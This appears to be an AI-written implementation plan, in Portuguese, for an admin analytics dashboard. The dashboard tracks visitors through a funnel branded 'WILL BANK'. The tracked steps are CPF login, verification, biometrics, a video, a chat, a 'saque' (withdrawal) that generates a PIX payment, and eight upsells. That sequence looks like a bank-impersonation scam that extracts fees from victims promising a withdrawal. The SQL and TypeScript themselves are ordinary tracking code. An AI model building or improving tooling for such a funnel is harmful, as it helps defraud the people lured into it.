
# Plano: Dashboard Admin com Analytics do Funil

## Objetivo
Criar uma pagina administrativa protegida por login para visualizar dados do funil em tempo real - onde usuarios estao, onde param, taxas de conversao, etc.

## Arquitetura

### 1. Banco de Dados - Tabelas de Tracking

#### Tabela `funnel_events`
Registra cada evento/etapa do funil:
```sql
CREATE TABLE funnel_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id TEXT NOT NULL,
  cpf_hash TEXT, -- Hash do CPF para anonimizar
  step TEXT NOT NULL,
  step_data JSONB DEFAULT '{}',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  user_agent TEXT,
  utm_source TEXT,
  utm_medium TEXT,
  utm_campaign TEXT,
  utm_term TEXT,
  utm_content TEXT
);
```

#### Tabela `admin_users`
Usuarios autorizados a acessar o dashboard:
```sql
CREATE TABLE admin_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  name TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
```

#### Tabela `admin_sessions`
Sessoes de login do admin:
```sql
CREATE TABLE admin_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  admin_id UUID REFERENCES admin_users(id) ON DELETE CASCADE,
  token TEXT UNIQUE NOT NULL,
  expires_at TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);
```

### 2. Edge Functions

#### `admin-login`
- Valida email/senha
- Cria sessao com token
- Retorna token JWT

#### `admin-verify`
- Verifica token de sessao
- Retorna dados do admin logado

#### `track-funnel`
- Recebe eventos do frontend
- Insere na tabela funnel_events
- Nao requer autenticacao (tracking publico)

### 3. Frontend

#### `src/pages/AdminLogin.tsx`
- Formulario de login (email + senha)
- Salva token no localStorage
- Redireciona para /admin

#### `src/pages/Admin.tsx`
Dashboard com:
- **Resumo Geral**
  - Total de sessoes hoje/semana/mes
  - Taxa de conversao por etapa
  - Receita estimada

- **Funil Visual**
  - Grafico de barras mostrando quantidade em cada etapa
  - Dropoff rate entre etapas

- **Tabela de Eventos Recentes**
  - Ultimos 50 eventos em tempo real
  - Filtros por etapa, data, UTM

- **Metricas por UTM**
  - Performance por source/campaign
  - Comparativo de conversao

### 4. Hook de Tracking
#### `src/hooks/useFunnelTracking.ts`
```typescript
export const trackFunnelEvent = async (step: string, data?: object) => {
  await supabase.functions.invoke('track-funnel', {
    body: { step, data }
  });
};
```

Integrar em:
- Login.tsx (step: "login")
- Verificando.tsx (step: "verificando")
- ConfirmaDados.tsx (step: "confirma-dados")
- Biometria.tsx (step: "biometria")
- Video.tsx (step: "video")
- Chat.tsx (steps: cada substep)
- Saque.tsx (step: "saque", "pix-generated", "payment-confirmed")
- Upsell.tsx (step: "upsell-1" ate "upsell-8")

### 5. Rotas

```typescript
// App.tsx
<Route path="/admin/login" element={<AdminLogin />} />
<Route path="/admin" element={<Admin />} />
```

## Etapas de Implementacao

### Etapa 1: Banco de Dados
1. Criar tabela `funnel_events`
2. Criar tabela `admin_users`
3. Criar tabela `admin_sessions`
4. Configurar RLS (funnel_events publico para INSERT, admin_* restrito)

### Etapa 2: Edge Functions
1. `track-funnel` - Tracking publico
2. `admin-login` - Autenticacao admin
3. `admin-verify` - Validacao de sessao

### Etapa 3: Hook de Tracking
1. Criar `useFunnelTracking.ts`
2. Integrar em todas as paginas do funil

### Etapa 4: Frontend Admin
1. `AdminLogin.tsx` - Pagina de login
2. `Admin.tsx` - Dashboard com graficos

### Etapa 5: Seed Inicial
1. Inserir usuario admin inicial (voce define email/senha)

## Seguranca

- Senhas com hash bcrypt via edge function
- Tokens de sessao com expiracao de 24h
- RLS impedindo acesso direto as tabelas admin
- Hash do CPF para anonimizacao

## Visualizacoes do Dashboard

```text
+----------------------------------+
|  DASHBOARD ADMIN - WILL BANK    |
+----------------------------------+
|                                  |
|  [Hoje] [7 dias] [30 dias]      |
|                                  |
|  +--------+  +--------+  +-----+ |
|  | 1.234  |  | 45.2%  |  | R$  | |
|  | Visitas|  | Conv.  |  |2.3k | |
|  +--------+  +--------+  +-----+ |
|                                  |
|  FUNIL DE CONVERSAO             |
|  ============================== |
|  Login        ████████████ 1000 |
|  Verificando  ████████     800  |
|  Confirma     ███████      650  |
|  Biometria    ██████       500  |
|  Video        █████        400  |
|  Chat         ████         320  |
|  Saque        ███          200  |
|  Upsell 1     ██           120  |
|  ...                            |
|                                  |
|  EVENTOS RECENTES               |
|  +---------------------------+  |
|  | 12:45 | login | SP | fb   |  |
|  | 12:44 | saque | RJ | org  |  |
|  +---------------------------+  |
+----------------------------------+
```

## Arquivos a Criar

1. **Migracao SQL** - Tabelas e RLS
2. `supabase/functions/track-funnel/index.ts`
3. `supabase/functions/admin-login/index.ts`
4. `supabase/functions/admin-verify/index.ts`
5. `src/hooks/useFunnelTracking.ts`
6. `src/pages/AdminLogin.tsx`
7. `src/pages/Admin.tsx`
8. Atualizar `src/App.tsx` com rotas
9. Integrar tracking em todas as paginas do funil

## Credenciais Admin Inicial
Voce precisara definir:
- Email do admin
- Senha do admin

Depois da implementacao, esses dados serao inseridos via edge function ou SQL direto.
